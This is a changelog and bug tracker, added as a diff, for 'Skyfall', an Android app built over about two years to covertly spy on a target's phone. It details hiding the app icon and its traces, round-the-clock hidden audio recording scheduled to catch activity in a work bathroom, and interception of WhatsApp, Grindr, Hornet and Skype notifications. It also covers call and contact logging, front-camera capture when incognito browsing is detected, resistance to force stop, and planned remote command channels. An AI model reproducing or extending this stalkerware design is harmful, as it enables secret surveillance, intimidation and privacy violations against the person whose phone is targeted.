@@ -1,0 +1,229 @@
+﻿VERSION 1.0 [Increment 1] [DEPLOYED on 01 February 2019]
+	> [OK]	Skyfall logs device states to private folder in internal storage;
+	> [OK]	Process started as foreground service after device successful boot;
+	> [OK]	After 1st initialization of main Activity, application icon is self hidden;
+	> [OK]	BroadcastReceivers for charger, screen unlock, device shutdown, airplane mode, gps mode;
+	> [OK]	BroadcastReceiver for network states (wifi / mobile);
+	> [OK]	BroadcastReceiver for phone calls (idle, offhook, place, receive) including number;
+	> [OK]	Custom runtime commands through phone dialing;
+	> [OK]	Audio recording implemented through custom command;
+	_
+
+VERSION 1.1 [Increment 2] [DEPLOYED on 17 March 2019]
+	> [OK]	Skyfall now resumes recording job after a device/application shutdown/reboot;
+	> [OK]	Changed toasts to acronyms for better stealth;
+	> [OK]	Now battery level will be logged when boot/shutdown/reboot/charger is detected;
+	> [OK]	Improved Media folder stealth by placing a .nomedia file in application work folder;
+	> [OK]	Now when WiFi is online application will access a remote PHP script which captures the public IP;
+	> [OK]	Improved logging for cleaner and better readability by using HTML language;
+	> [OK]	Now when invoking manual command call, its trace is removed from history;
+	_
+
+VERSION 1.2 [Increment 3] [DEPLOYED on 9 April 2019]
+	> [OK]	Code revision and refactoring for better flow and management;
+	> [OK]!	More exceptions check implementation in order to maximize stealth and minimize possible UI interference;
+	> [OK]	Better network states (WiFi & mobile) logging;
+	> [OK]!	Implementing of external apps notifications logging;
+	> [OK]	Frontal camera record when Chrome Incognito notification is intercepted;
+	> [OK]!	Implement scheduled audio recording at specific times during weekdays to avoid overall battery impact (~67,30% storage/energy reduction);
+	_
+
+	1.2.1 [Increment 4] [DEPLOYED on 10 April 2019]
+			> [OK]	Battery usage fix in TimeTickReceiver.OnReceive(): now file existence is queried only when audio record schuduled time is met instead of every tick (minute) check;
+			_
+
+VERSION 1.3.14 [Increment 19] [DEPLOYED on January 2020]
+	Goals:
+	> [NFX]!	Implement SMS reporter so we can receive in real-time all app local notifications;
+	> [ABT]!	Implement SMS command listener;
+	> [ABT]!	Implement command stack processor class for command pause, resume and schedule interoperability;
+	> [ABT]		Implement a secondary network state receiver (and possibly merge them);
+	General:
+			> [OK]	NotificationInterceptService filters more unnecessary items (like self messages and backups in WhatsApp);
+			> [OK]	Periodically clear notificationArrayList in order to free unnecessary cumulative memory usage;
+			> [OK]	VideoRecorder is now disabled;
+			> [OK]	SMSPublisher is now disabled;
+			> [OK]	.overtime audio record scheduler file is not auto created anymore; removed;
+			> [OK]	Four more apps added to NotificationInterceptService (br.com.uol.batepapo, com.grindrapp.android, com.hornet.android, com.skype.raider);
+			> [OK]	Auto refresher removed from HTML log files;
+			> [OK]	Some compiler options reverted to standards;
+			> [OK]	BootStateReceiver removed; now the NotificationListenerService acts as the kernel service; code refactor;
+			> [OK]	TimeStateReceiver now records audio regadrless of schedule file(s);
+			> [OK]	NotificationArrayList now is cleared after a preset number of entries to avoid future items which are not duplicate to get filtered (like "John sent a photo");
+			> [OK]	Improved AudioRecordSchedule() in TimeStateReceiver; also it now starts from 5:30am instead of 6:00am and from 17h to 18:00h instead of 17h to 19h;
+			> [OK]	AudioRecorder refactored so intents do not overlap each other; also Manual intent does not have a duration limit anymore;
+			> [OK]	NotificationInterceptor now will use the object's post time as key for repetition filtering;
+			> [OK]	AudioRecorder pause/resume implemented;
+			> [OK]	Camera availability detection in order to pause/resume recording when third party apps request/release hardware;
+			> [ABT]	When a WhatsApp call is placed now AudioRecorder will be accordingly paused/resumed;
+			> [OK]	Enhanced audio recording output quality (raised bitrate from 128000 to 256000 and sampling from 44100 to 48000);
+			> [OK]	AudioRecordSchedule now will record Saturday and Sunday from 5am to 9am;
+			> [OK]	AudioRecordSchedule now uses DateTime.UtcNow instead of DateTime.Now for better power reliability;
+			> [OK]	AudioRecordSchedule record now starts from 15h from Monday to Thursday in order to capture potencial insteresting activity in work bathroom;
+			> [OK]	AudioRecordSchedule record frame increased from 15m to 20m after 9am during weekdays;
+			> [OK]	AudioRecordSchedule record now starts from 3am everyday;
+			> [OK]	AudioRecorder will be properly stopped when a shutdown/reboot action is received to prevent audio data corruption;
+			> [OK]	Audio files extension renamed from .aac to .m4a;
+			> [OK]	Now it is possible to repair damaged audio files using external tools in any computer (HxD, faad, faac);
+			> [OK]	Now audio record files extension will contain a trailing ".0" in order to prevent explicit execution by the target phone itself; just remove it in order to play;
+			> [OK]	Adjusted AudioRecordSchedule() to cover more hours on Friday and specially on weekends;
+			> [OK]	Fixed notifications intercept cache clear by each 2 hours in order to rellog a previous occurrence (key);
+			> [OK]	Some audio recording schedule adjustments to minimize disk space impact by including only crucial moments;
+			> [OK]	Apprimorated Android build options in order to optimize runtime performance and reliability;
+			_
+			
+
+VERSION 1.5.0 [Increment 37] [RELEASED on August 2020] [Codename: Graphite] (19 development months)
+	Goals:
+	> [OK]	Bind DeviceAdmin to block force stop and battery optimization;
+	> [ABT]	Implement a manual command for AudioRecorder full emergency stop/recover (for last case use only) for when Skyfall persistently interferes third party apps and we don't want to uninstall it;
+	> [NEXT]	Implement lux sensor logging (values: dark, dim, indoor, outdoor);
+	> [ABT]	Implement InternetCommandStreamChannel via PHP (server side) and HTTP requests. Tristate (Start/Stop/Ignore);
+	> [NEXT]	Implement realtime microphone online stream;
+	> [ABT]	Implement auto/manual command for work directory archiving & recycling;
+	> [OK]	Implement app activity interceptor, for logging which application is the main activity on screen;
+	> [ABT]	Implement incoming remote commands through SMS;
+	> [ABT]	Initial integration to Firebase;
+	> [ABT]	Firebase email/password authentication;
+	> [ABT]	Implement ZIP archiving for AudioRecorder on absolute stop for facilitating manual data retrieval from device;
+	> [ABT]	Implement enforcing mode for reswitching airplane, GPS and networking to online when manual toggle is detected;
+	> [OK]	Detect contact name (if it exists) when call is received or placed;
+	> [OK]	Code refactoring and reorganization;
+	General:
+		> [ABT]	Versioning altered to be equivalent to month (10 = October, and so on);
+		> [OK]	Compabibility with Android 10;
+		> [ABT]	Now Skyfall launcher icon will not be auto hidden from app drawer;
+		> [OK]	New "Abduction" application icon;
+		> [OK]	ActivationActivity no longer asks for app permissions, it is now necessary to manually grant them in system settings when needed;
+		> [OK]	NetworkStateReceiver enhanced to distinguish between connection loss (accidental) and interfaces disabled (intentional);
+		> [OK]	Refactored and merged NotificationListenerService into AccessibilityService; now everything is executed under a single priviledged service;
+		> [OK]	Fixed app header not being logged in occasional initialization cases;
+		> [OK]	CameraStateReceiver will no longer interfere AudioRecorder (removed) (Android 10 allows more than one app to use the microphone);
+		> [ABT]	Disk class is now partial within Kernel;
+		> [OK]	Removed unused permissions from AndroidManifest;
+		> [OK]	Removed unnecessary volume raise from RecordIntent.PhoneCall;
+		> [OK]	Adjusted audio record schedule to capture only mornings and weekends from midnight to noon;
+		> [OK]	NetworkStateReceiver now won't leak public IP (no real case use as for now) saving battery where network is unstable (many reconnections);
+		> [OK]	NetworkStateReceiver simplified/refactored for propper logging;
+		> [ABT]	Improved HTML logs spacing (word-wrap) output;
+		> [OK]	Fixed screen state sometimes getting overlaped when on/off state change is too fast;
+		> [ABT]	ActivationActivity now automatically opens Applications settings and Accessibility (in respective order) as shortcuts;
+		> [OK]	Changed NotificationArrayList type from ArrayList to List in order for .Clear() to work properly and to minimize memory footprint;
+		> [ABT]	Added a memory garbage collection in Time class within a 2 hours interval to aid low memory usage;
+		> [OK]	ClearNotificationInterceptCache() now is PerformMemoryMaintenance();
+		> [ABT]	Adjusted AudioRecorder auto schedule to conform with COVID-19 quarantine, now it behaves like weekends everyday (from 0h to 12h);
+		> [OK]	Removed manual commands from PhoneDriver since AudioRecorder will be working 24/7; thus no need to issue start/stop record commands through dial;
+		> [OK]	Renamed "Media/Audio" path to "Audio";
+		> [ABT]	Now the Audio directory works directly as a ZIP archive, files are stored as recordings are finished; on failure the recordings remain raw in work directory;
+		> [OK]	Improved GPS state reporting to a finer level, covering all 4 possible values;
+		> [OK]	Improved exception logging by removing unnecessary info;
+		> [OK]	Improved phone call logging to work with multiple ongoing calls;
+		> [OK]	Sound feedback Beep() implemented using a very subtle sample;
+		> [ABT]	Now the Disk class will check if there is enough available storage space before trying to compress/pack an audio file (BUG #26);
+		> [OK]	Now AudioRecorder works 24/7, idependent of COVID-19; two files are created: AM and PM;
+		> [OK]	Now all captured notifications will be recorded in .AllNotifications.htm (filtered notifications will remain being logged in a separate file);
+		> [OK]	Now disabling the accessibility service or shutting down the device correctly terminates it, avoiding data leak/corruption;
+		> [OK]	AudioRecord does not depends on Time driver anymore and now is immediately started on Kernel connect; The .Start() call remains in Time driver for insurance purpose and file fragmentation (so we don't nd up with a huge one);
+		> [ABT] Priorization proxy overlay (hidden) implemented in the accessibility service in order to fix device memory pressure Kernel easy shutdown;
+		> [OK]	ShowToast() removed since no other function uses it anymore;
+		> [OK]	Minor memory usage improvements;
+		> [ABT] Disk now uses MediaStore.Files.GetContentUri("external").Path instead of deprecated Android.OS.Environment.ExternalStorageDirectory.AbsolutePath;
+		> [OK]	Beep() now uses Android.Media.ToneGenerator instead of an external assembly (Xam.Plugin.SimpleAudioPlayer);
+		> [OK]	Removed Intent.ActionReboot from SettingDriver since Intent.ActionShutdown is always triggered in its place;
+		> [OK]	Removed AppCompat assembly since we don't have any activity;
+		> [OK]	Removed logging from PerformMemoryMaintenance();
+		> [OK]	Cleaned up unused assets in /Resources;
+		> [OK]	Improved Disk class to only open StreamWriter once (upon initialization) to avoid a huge amount of open/close;
+		> [OK]	Fixed 1 minute shadow in AudioRecordSchedule();
+		> [OK]	Removed Suspended, Lost, Online and Offline sates from NetworkDriver; Now only Enabled or Disabled are reported;
+		> [OK]	NetworkDriver now works independent from Kernel and in conjunction with TimeDriver; states changes are checked every minute (tick);
+		> [OK]	PhoneDriver removed and merged into NotificationDriver; logs are isolated in new .Calls.htm file (new log stream in Disk class);
+		> [OK]	Log file names renamed and simplified;
+		> [OK]	Removed prefix . from work directory and log files in order to be able to access them through remote access applications (AirDroid, for instance);
+		> [OK]	Removed Admin privileges;
+		> [OK]	Removed launcher activity (ActivationActivity);
+		> [OK]	Removed dedicated StreamWriter for calls; now calls ae logged along with Notifications;
+		> [OK]	Time is now part of the Kernel itself (not considered a driver anymore);
+		> [OK]	Removed unused shutdownSignal boolean flag from SettingDriver;
+		> [OK]	Removed dedicated StreamWriter for filtered notifications log; merged with all notifications and properly filtered against null and duplicates;
+		> [OK]	Adopted new versioning scheme: MAJOR.MINOR.INCREMENT where MINOR is "pair" when in development and "odd" in release (like in GNOME project); thus next stable release is 1.5;
+		> [OK]	Appended "Graphite" as release codename;
+		_
+
+
+VERSION 1.5.1 [Increment 38] [RELEASED on November 2020] [Codename: Graphite] (22 development months)
+	Patch Update:
+		> [OK]	Activated Xamarin concurrent garbage collector to avoid thread interruptions;
+		> [OK]	Removed unused READ_CONTACTS permission;
+		> [OK]	Kernel.Beep() is now asycronous (and thus does not block initialization by 1000 milliseconds);
+		> [OK]	Time.AudioRecordSchedule() is now AudioRecorder.Schedule();
+		> [ABT]	Disk.LogMessage() now asyncronously writes and flushes to disk;
+		> [ABT]	AudioRecorder encoding bit rate changed from 384000 to 529000;
+		> [ABT]	AudioRecorder encoding sample rate changed from 44100 to 96000;
+		> [OK]	SettingsDriver now assumes GPS mode on boot is 3 (high accuracy) to prevent unnecessary reporting;
+		> [OK]	Removed some generic and unnecessary notificationBlock filters from FilterNotificationContent() like "você" and "backup";
+		> [OK]	Now if Dialer is detected in a notification its title (if a number) will be correctly converted into its corresponding contact name (if any);
+		> [OK]	DEBUG and TRACE constants disabled;
+		> [OK]	All catch{} statements now will call Kernel.Beep() to reproduce a distinct error signal; non logged exceptions can now be audible;
+		> [OK]	AudioRecorder encoding bit rate changed from 384000 to 320000;
+		_
+
+VERSION 1.6.0 [Increment 39] [SCHEDULED for March 2021] [Codename: Graphite] (26 development months)
+	Feature Update:
+		> [HLT]	AudioRecorder module now uses Android's AudioRecord instead of MediaRecorder class;
+			> [OK]	MEDIA_AUDIO_FILE_EXTENSION changed from .m4a to .wav (raw header-less pulse-code modulation) in order to comply with Android's AudioRecord raw output format; WAV is used here instead of PCM so it can be played directly with VLC app in device;
+			> [HLT] Changes below made in order to achieve ~7.62GB per 24 hours while preserving quality;
+				> AudioRecorder encoding encoding changed from AAC to PCM16;
+				> AudioRecorder encoding input channel changed from Stereo to Mono; to reduce file size and double the hearing of one channel sounds;
+			> [OK]	AudioRecorder.WriteToDisk() now inspects for current file size; if ~3GB is reached the method recursively recalls itself in the same thread to use another file; Android does not allow files greater than ~4GB;
+		> [OK]	PerformMemoryMaintenance() moved from Kernel to Notification driver as ClearFilter();
+		> [OK]	ActivityDriver and NotificationDriver now contained in their own classes instead of partial to Kernel;
+		> [OK]	Significantly reduced/prevented Kernel reboots by implementing AudioRecorder as a threaded module;
+		> [OK]	Disk.LogException() now is single line to avoid flood and confusion when analysing logs;
+		> [ABT]	Implemented Kernel.OnTrimMemory() and Kernel.OnLowMemory() overrides in order to log useful info on device pressure states for future debugging purposes;
+		> [ABT]	Disk.LogMessage() now keeps track of last logged string to prevent duplicated entries one right after the other, this improves Kernel.OnTrimMemory() logging;
+		> [WRK]	Kernel and ActivityDriver are now finally able to log current activity window title;
+		> [ABT]	Removed HTML headers from log files;
+		> [OK]	Disk class now uses Android\Cache directory instead of pure external; this will allow the system to count and associate data files length in Skyfall app info screen (and storage settings); we can also easily remove/recycle data by simply uninstalling/clearing Skyfall;
+		> [OK]	Removed READ_EXTERNAL_STORAGE permission from manifest file since WRITE_EXTERNAL_STORAGE automatically grants read permissions;
+
+		> [TST]	Halted/deactivated AudioRecorder due to the lack of necessity in actual conditions; will resume later in order to implement real-time audio online stream (without recording);
+		> [TST]	Deactivated beep feedback in order to minimize execution footprint;
+
+
+
+Codenames:
+	Graphite	(1)
+	Carbon		(2)
+	Quartzo		(3)
+_________
+BUGS:
+	FIXED	- 01:[MG2/MG5]	[31/01/2019]	External video record is auto nulled when Skyfall media record is active; Fixed in 1.3.5;
+	FIXED	- 03:[MG5]		[01/02/2019]	While audio recording then phone state hooks off, the call recording crashes; Fixed in v1.2 (VoiceCall is not possible, implemented by enhanced mic record);
+	FIXED	- 04:[MG2/MG5]	[05/02/2019]	While audio recording and phone reboots, job is not resumed; Fixed in v1.1 by using SharedPreferences;
+	FIXED	- 05:[MG5]		[16/03/2019]	Right after boot Android clock is yet to be syncronized with network, this may cause wrong initial timestamp in log; Fixed in v1.2;
+	FIXED	- 06:[MG5]		[16/03/2019]	Network change is being logged twice or even more (broadcast is fired multiple times); Fixed in v1.2;
+	FIXED	- 07:[MG5]		[17/03/2019]	When issuing a manual command call, instead of only clearing last call from history all of it is purged and not always anything is purged; Fixed in v1.2;
+	FIXED	- 08:[MG5]		[17/03/2019]	GPS state change is not correctly detected, specially when disabled; Fixed in v1.2;
+	FIXED	- 09:[MG7]		[25/03/2019]	When there is a phone event it fires twice: first with null incoming number and second correctly; Fixed in v1.2;
+	FIXED	- 10:[MG7]		[25/03/2019]	When baterry saving is active GPS is reported as false when screen goes off and true when unlocked; Fixed in v1.2 by refactoring;
+	FIXED	- 11:[MG7]		[29/03/2019]	When listening to WhatsApp audio message, its notification contents are not simple text and Skyfall crashes; Fixed in v1.2;
+	FIXED	- 12:[MG7]		[04/04/2019]	While in an ongoing call and a secondary call is received (ignored) it's logged as answered, first call recording is not affected; Fixed in v1.2;
+	FIXED	- 13:[MG7]		[04/04/2019]	[ALWAYS] Phone/WhatsApp calls/audiosend are not being recorded due to microphone lock; NOFIX: WhatsApp requires exclusive access to recources; FIX after Android 10;
+	FIXED	- 14:[MG5/MG7]	[06/04/2019]	[ALWAYS] WhatsApp call fails (no input mic) when AudioRecorder is active (similar to bug #1); possible solution is to create a pause/resume mechanism;
+	FIXED	- 15:[MG5]		[??/??/????]	Media recording interoperability is very unstable; need to investigate; fixed since VideoRecorder has been disabled in 1.3 series;
+	FIXED	- 16:[MG5/MG7]	[23/07/2019]	Audio recording intents (auto, manual, phonecall) can overlap each other on Stop();
+	FIXED	- 17:[MG5/MG7]	[08/08/2019]	Nofitications repetition filter is excluding not duplicates (like "John sent a photo"); sometimes these are actual distinct messages in distinct time frames, clearing the buffer is not a solution;
+	FIXED	- 18:[MG5/MG7]	[08/08/2019]	[OCCASIONAL] Network states logging has gaps and sometimes misses change events; possible solution is to review and refactore it;
+	FIXED	- 19:[MG5/MG7]	[??/??/????]	Sometimes NULL notifications are logged; investigation about the origins is necessary to determine and fix or filter these objects; These are action notifications (like listening to an audio in WhatsApp); Fixed in 1.3.6;
+	FIXED	- 20:[MG7]		[24/08/2019]	When interoping device camera and AudioRecorder pause/resume (camera availability), if camera state shifts too fast (inside same second window) an exception on MediaRecorder.start or .stop may occur; Fixed in 1.3.7;
+	FIXED	- 21:[MG7]		[27/08/2019]	When interating with camera OnCameraUnavailable is triggered, but if immediately pushing the sleep button, OnCameraAvailable will be triggered once but won't call AudioRecorder.Resume(); Fixed in 1.3.7;
+	IGNORE	- 22:[MG5]		[03/11/2019]	[RARE] Audio file not found (IOException) on MediaRecord.Prepare() after AudioRecord.Pause() triggered by camera state; need to investigate;
+	FIXED	- 23:[MG5]		[??/??/????]	[OCCASIONAL] Sometimes "SLEEP" (now "LOCK") screen state is recorded twice;
+	FIXED	- 24:[MG7]		[12/04/2020]	[ALWAYS] AudioRecorder schedule never records Sundays;
+	FIXED	- 25:[MG5/MG7]	[11/04/2020]	[ALWAYS] If there is no cell phone operator signal, the phone dialer will not let any outgoing calls to be initiated, that means no manual commands can be issued on this situation (and no remote commands for receiving);
+	ABORT	- 26:[MG7]		[18/04/2020]	[ALWAYS] When compressing an audio file, if the device is shutdown or run out of storage, the process will fail and the corrupt encapsulated file will remain dead on disk;
+	IGNORE	- 27:[MG7]		[28/05/2020]	[ALWAYS] When there is multiple ongoing phone call only the last hungup will be logged;
+	IGNORE	- 28:[MG5]		[??/??/????]	[ALWAYS] When the device is very low on RAM (gaming) the memory pressure forces the Kernel to temporarily shutdown; this is a critical breach; Ignored since Android restart service after game is closed and RAM normalizes;
+	IGNORE	- 29:[MG7]		[28/07/2020]	[RARE] Once, when disabling the Kernel service it did not executed the termination function; observe and investigate;
+	FIXED	- 30:[MG5]		[08/11/2020]	[OCCASIONAL] Notification driver does not always capture existing contact names during calls;
